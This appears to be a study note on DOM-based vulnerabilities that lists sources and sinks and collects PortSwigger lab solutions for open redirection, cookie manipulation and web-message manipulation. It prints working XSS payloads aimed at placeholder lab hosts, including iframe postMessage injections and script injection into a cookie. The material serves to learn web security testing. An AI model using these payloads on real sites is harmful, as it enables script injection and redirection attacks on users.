# DOM Vulnerabilities  
[HackTricks-DOM](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-xss)  
DOM vulnerabilities occur when data from attacker-controlled sources (like location.search, document.referrer, or document.cookie) is unsafely transferred to sinks. Sinks are functions or objects (e.g., eval(), document.body.innerHTML) that can execute or render harmful content if given malicious data.  

・**Sources** are inputs that can be manipulated by attackers, including URLs, cookies, and web messages.  

・**Sinks** are potentially dangerous endpoints where malicious data can lead to adverse effects, such as script execution.  

The risk arises when data flows from a source to a sink without proper validation or sanitation, enabling attacks like XSS.  

##  Common sources  
```
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
document.cookie
document.referrer
window.name
history.pushState
history.replaceState
localStorage
sessionStorage
IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
Database
```
## Common Sinks  
The following are some of the main sinks that can lead to DOM-XSS vulnerabilities:   
```
document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent
```
The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities: 
```
add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()
```
The innerHTML sink doesn't accept script elements on any modern browser, nor will svg onload events fire. This means you will need to use alternative elements like img or iframe.  

This kind of XSS is probably the hardest to find, as you need to look inside the JS code, see if it's using any object whose value you control, and in that case, see if there is any way to abuse it to execute arbitrary JS.

### Examples
- **DOM-based open redirection**  
    Open redirect vulnerabilities in the DOM occur when a script writes data, which an attacker can control, into a sink capable of initiating navigation across domains.  
    By controlling the start of the URL where the redirect occurs, it is possible to execute arbitrary code such as `javascript:alert(1)`.
   
    Main sinks can lead to DOM-based open-redirection vulnerabilities:  
    ```
    location
    location.host
    location.hostname
    location.href
    location.pathname
    location.search
    location.protocol
    location.assign()
    location.replace()
    open()
    element.srcdoc
    XMLHttpRequest.open()
    XMLHttpRequest.send()
    jQuery.ajax()
    $.ajax()
    ```  
  From: https://portswigger.net/web-security/dom-based/open-redirection
    ```    
    https://YOUR-LAB-ID.web-security-academy.net/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/
    ```

    
- **DOM-based cookie manipulation**  
    DOM-based cookie-manipulation vulnerabilities occur when a script incorporates data, which can be controlled by an attacker, into the value of a cookie.  
    This vulnerability can lead to unexpected behavior of the webpage if the cookie is utilized within the site.
    Additionally, it can be exploited to carry out a session fixation attack if the cookie is involved in tracking user sessions.
  
    The primary sink associated with this vulnerability is:
    ```
    document.cookie
    ```
    From: https://portswigger.net/web-security/dom-based/cookie-manipulation/
    ```
    <iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
    ```


- **Web-message manipulation**  
    Web-message vulnerabilities arise when a script sends attacker-controllable data as a web message to another document within the browser.
    
    Sinks:
    The `postMessage()` method for sending web messages can lead to vulnerabilities if the event listener for receiving messages handles the incoming data in an unsafe way.  
    1. web messages  
    >Notice that the home page contains an addEventListener() call that listens for a web message
    ```
    <iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
    ```
    2. web messages and a JavaScript URL
    ```
    <iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
    ```
    3. web messages and JSON.parse
    ```
    <iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
    ```
### Others  
https://portswigger.net/web-security/dom-based
